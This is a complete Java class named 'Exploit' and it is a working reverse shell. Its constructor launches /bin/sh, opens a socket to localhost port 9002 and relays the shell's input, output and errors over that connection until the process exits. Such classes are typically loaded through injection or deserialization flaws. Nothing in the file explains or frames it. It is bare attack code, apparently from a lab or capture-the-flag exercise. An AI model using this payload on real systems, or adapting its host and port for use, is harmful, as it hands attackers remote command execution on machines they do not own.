
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {

    public Exploit() throws Exception {
        String localhost="localhost";
        int portnumber=9002;
        String command="/bin/sh";
        Process process=new ProcessBuilder(command).redirectErrorStream(true).start();
        Socket soc=new Socket(localhost,portnumber);
        InputStream is=process.getInputStream(),
            es=process.getErrorStream(),
            sis=soc.getInputStream();
        OutputStream osp=process.getOutputStream(),sop=soc.getOutputStream();
        while(!soc.isClosed()) {
            while(is.available()>0)
                sop.write(is.read());
            while(es.available()>0)
                sop.write(es.read());
            while(sis.available()>0)
                osp.write(sis.read());
            sop.flush();
            osp.flush();
            Thread.sleep(50);
            try {
                process.exitValue();
                break;
            }
            catch (Exception e){
            }
        };
        process.destroy();
        soc.close();
    }
}
